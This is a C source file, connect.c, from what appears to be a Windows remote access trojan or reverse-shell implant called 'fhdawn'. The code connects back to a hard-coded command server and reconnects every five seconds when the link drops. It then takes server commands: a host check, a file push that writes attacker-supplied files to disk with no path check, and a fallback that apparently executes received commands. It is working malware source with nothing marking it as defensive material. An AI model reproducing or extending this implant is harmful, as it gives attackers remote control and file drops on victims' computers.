/*
Author: Fahad (QuantumCore)
connect.c (c) 2020
Created:  2020-08-15T15:27:04.427Z
Modified: -
*/

#include "fhdawn.h"

// By @augustgl
int sockprintf(SOCKET sock, const char* words, ...) {
    static char textBuffer[BUFFER];
    va_list args;
    va_start(args, words);
    vsprintf(textBuffer, words, args);
    va_end(args);
    return send(sock, textBuffer, strlen(textBuffer), 0); // see, it's printf but for a socket. instead of printing, at the end it's a send()
}

void REConnect(void)
{
    closesocket(sockfd);
    WSACleanup();
    Sleep(5000);
    MainConnect();
}

void sockSend(const char* data)
{
    int lerror = WSAGetLastError();
	int totalsent = 0;
	int buflen = strlen(data);
	while (buflen > totalsent) {
		int r = send(sockfd, data + totalsent, buflen - totalsent, 0);
		if (lerror == WSAECONNRESET)
		{
			connected = FALSE;
		}
		if (r < 0) return;
		totalsent += r;
	}
	return;
}

void fhdawn_main(void)
{
    while(connected)
    {
        memset(recvbuf, '\0', BUFFER);
        int return_code = recv(sockfd, recvbuf, BUFFER, 0);
        if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
        {
            connected = FALSE;
        }

        if(strcmp(recvbuf, "checkhost") == 0)
        {
            memset(recvbuf, '\0', BUFFER);
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            CheckHost(recvbuf);

        }
        // TODO: Add File Path check.
        // TODO: Fix notify bug
        else if (strcmp(recvbuf, "frecv") == 0) // frecv (file recv) / recv file from server 
        {
            memset(recvbuf, '\0', BUFFER);
            int fsize = 0;
            int expected = 0;
            char * fileinfo[2];
            DWORD dwBytesWritten = 0;
            BOOL write;
            // Receive Filename and Filesize.
            // Format is filename.txt:filesizeinbytes.
            // Split using ':' delimieter
            int return_code = recv(sockfd, recvbuf, BUFFER, 0);
            if (return_code == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
            {
                connected = FALSE;
            }
            split(recvbuf, fileinfo, ":");
            expected = atoi(fileinfo[1]);
            // Create file.
            HANDLE recvfile = CreateFile(fileinfo[0], FILE_APPEND_DATA, 0, NULL, OPEN_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
            if(recvfile == INVALID_HANDLE_VALUE){
                sockprintf(sockfd, "[Error Creating File] : %ld", GetLastError());
            } else {
                // Start receiving file
                // once again clear recvbuf
                memset(recvbuf, '\0', BUFFER);
                int total = 0;
                do {
                    fsize = recv(sockfd, recvbuf, BUFFER, 0 );
                    if (fsize == SOCKET_ERROR && WSAGetLastError() == WSAECONNRESET)
                    {
                        connected = FALSE;
                        printf("[X] Connection interrupted while receiving file %s for %s size.", fileinfo[0], fileinfo[1]);
                    }
                    write = WriteFile(recvfile, recvbuf, fsize, &dwBytesWritten, NULL);
                    total += fsize;
                } while(total != expected);

                if(write == FALSE)
                {
                    sockprintf(sockfd,"[Error Writing file %s of %s size] Error : %ld.", fileinfo[0], fileinfo[1], GetLastError());
                } else {
                    sockprintf(sockfd,"[ Received File : %s]\n[ File Size : %s  ]\n[ Bytes written : %ld ]\n", fileinfo[0], fileinfo[1], dwBytesWritten);
                }
                CloseHandle(recvfile);
            }
            

        } 
        else {
            ExecSock();
        }
        
    }    
}

void StartWSA(void)
{
    WSADATA wsa;
    if(WSAStartup(MAKEWORD(2,2), &wsa) != 0)
    {
        printf("[Error] Error Starting Winsock.");
        WSAReportError();
    }
}


void MainConnect(void)
{
    StartWSA();
    sockfd = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, (unsigned int)NULL, 0);
    if(sockfd == SOCKET_ERROR || sockfd == INVALID_SOCKET)
    {
        printf("Socket Creation Error. ");
        WSAReportError();
        exit(1);
    }

    server.sin_addr.s_addr = inet_addr("127.0.0.1");
    server.sin_port = htons(421);
    server.sin_family = AF_INET;

    do {
        if (connect(sockfd, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR) {
            REConnect();
        }
        else {
            connected = TRUE;
        }
    } while (!connected); 

    fhdawn_main();
}